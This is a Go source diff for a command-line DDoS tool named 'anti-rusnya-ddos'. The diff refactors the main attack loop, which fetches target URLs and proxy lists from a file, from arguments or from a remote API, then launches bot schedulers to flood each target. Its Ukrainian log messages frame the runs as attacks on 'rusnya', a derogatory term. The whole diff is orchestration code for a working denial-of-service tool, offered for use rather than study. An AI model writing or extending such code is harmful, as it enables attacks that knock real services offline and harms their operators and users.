@@ -4,17 +4,11 @@ import (
 	"context"
 	"sync"
 	"sync/atomic"
-	"time"
 
 	log "github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
 
 	"github.com/meddion/anti-rusnya-ddos/pkg"
-)
-
-const (
-	GATEWAY_TIMEOUT = time.Second * 10
-	SRC_TIMEOUT     = time.Second * 10
 )
 
 var (
@@ -24,8 +18,9 @@ var (
 		Args:  cobra.MinimumNArgs(0),
 		Run:   ddatackRun,
 	}
-	gateway string
-	src     string
+	gateway    string
+	src        string
+	apiVersion int
 )
 
 func init() {
@@ -41,85 +36,96 @@ func init() {
 		"",
 		"джерело. адреса з якої отримати дані про атаку",
 	)
+
+	ddatackCmd.PersistentFlags().IntVar(
+		&apiVersion,
+		"api",
+		2,
+		"версія API джерела; досутпні версії: 1, 2",
+	)
 }
 
 func ddatackRun(cmd *cobra.Command, args []string) {
 	// Shutdown signal
-	done, terminate := CreateDoneChan()
-	startOsSignalHandler(terminate)
+	rootCtx, termProg := context.WithCancel(context.Background())
+	startOsSignalHandler(termProg)
 
 	epoch := int64(0)
 	for {
 		atomic.AddInt64(&epoch, 1)
 
 		select {
-		case <-done:
+		case <-rootCtx.Done():
 			return
 		default:
 		}
 
-		ctx, termBots := context.WithCancel(context.Background())
-		startBotHandler(done, termBots, &epoch, epoch)
+		var (
+			targets []pkg.Target
+			proxies []pkg.Proxy
+			err     error
+		)
+
+		switch {
+		// Get data from a file
+		case srcFile != "":
+			targets, proxies, err = pkg.GetDataFromFile(rootCtx, srcFile, apiVersion)
+			if err != nil {
+				log.Fatalf("Не вдалося прочитати вміст файлу '%s': %v", srcFile, err)
+			}
+		// Get targets (no proxy) from args
+		case len(args) > 0:
+			targets = make([]pkg.Target, 0, len(args))
+			for _, arg := range args {
+				targets = append(targets, pkg.Target{URL: arg})
+			}
+		// Get data from API
+		default:
+			if src == "" {
+				src, err = pkg.GetSrcFromAPIGateway(rootCtx, gateway)
+				if err != nil {
+					log.Errorf("Отримуючи списки джерел: %w", err)
+					continue
+				}
+			}
+
+			log.Infof("Обране джерело: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", src)
+
+			targets, proxies, err = pkg.GetDataFromAPISrc(rootCtx, src, apiVersion)
+			if err != nil {
+				log.Errorf("Не вдалося отримати коректні дані від джерела: %v", err)
+				continue
+			}
+
+			log.Infoln("Дані із джерела підвантажено.")
+		}
+
+		if len(proxies) == 0 {
+			log.Infoln("Проксі не знайдено")
+			if onlyProxy {
+				log.Fatalln("Не можу продовжити")
+			}
+		}
+		log.Infoln("Знайдено цілей:")
+		validTargets := make([]pkg.Target, 0, len(targets))
+		for i, target := range targets {
+			if err := pkg.ValidateTarget(&target); err != nil {
+				log.Errorf("Під час валідації даних про атаку (перевірте джерело): %v", err)
+				continue
+			}
+			validTargets = append(validTargets, target)
+			log.Printf("%d) %s\n", i+1, target.URL)
+		}
 
 		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
-		log.Infof("Кожні %d запитів ціль і проксі можуть змінюватися.\n", reqPerEpoch)
-
-		if src == "" {
-			srcCtx, cancel := context.WithTimeout(ctx, GATEWAY_TIMEOUT)
-			var err error
-			src, err = pkg.GetSrcURL(srcCtx, gateway)
-			cancel()
-			if err != nil {
-				select {
-				case <-ctx.Done():
-					if _, ok := ctx.Deadline(); ok {
-						log.Infof("Час очікування на джерела закінчився")
-						continue
-					}
-					return
-				default:
-				}
-
-				log.Infof("Отримуємо списки джерел: %v\n", err)
+		var wg sync.WaitGroup
+		for _, target := range validTargets {
+			botSched := pkg.NewBotScheduler(target, proxies, botsNum, maxErrCount, onlyProxy)
+			if err := botSched.StartBots(rootCtx, &wg); err != nil {
+				log.Errorf("Не вдалося запустити ботів: %v\n", err)
 				continue
 			}
 		}
-
-		log.Infof("Обране джерело: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", src)
-
-		srcCtx, cancel := context.WithTimeout(ctx, SRC_TIMEOUT)
-		srcRsp, err := pkg.GetDataFromSrc(srcCtx, src)
-		cancel()
-		if err != nil {
-			select {
-			case <-ctx.Done():
-				if _, ok := ctx.Deadline(); ok {
-					log.Infof("Час очікування від джерела закінчився")
-					continue
-				}
-				return
-			default:
-			}
-
-			log.Errorf("Не вдалося отримати дані від джерела: %v\n", err)
-			continue
-		}
-
-		if err := pkg.ValidateTargetData(srcRsp); err != nil {
-			log.Errorf("Під час валідації даних про атаку (перевірте джерело): %v", err)
-			continue
-		}
-
-		log.Infof("Дані із джерела підвантажено. Ціль: %s, К-ість проксі: %d\n",
-			srcRsp.Site.URL, len(srcRsp.Proxies))
-
-		var wg sync.WaitGroup
-		counter := make(chan bool, botsNum)
-		if err := pkg.StartBots(ctx, &wg, srcRsp, maxErrCount, botsNum, counter); err != nil {
-			log.Errorf("Не вдалося запустити ботів: %v\n", err)
-			continue
-		}
-		go pkg.RequestLimiter(ctx, termBots, &wg, reqPerEpoch, counter)
 
 		wg.Wait()
 	}
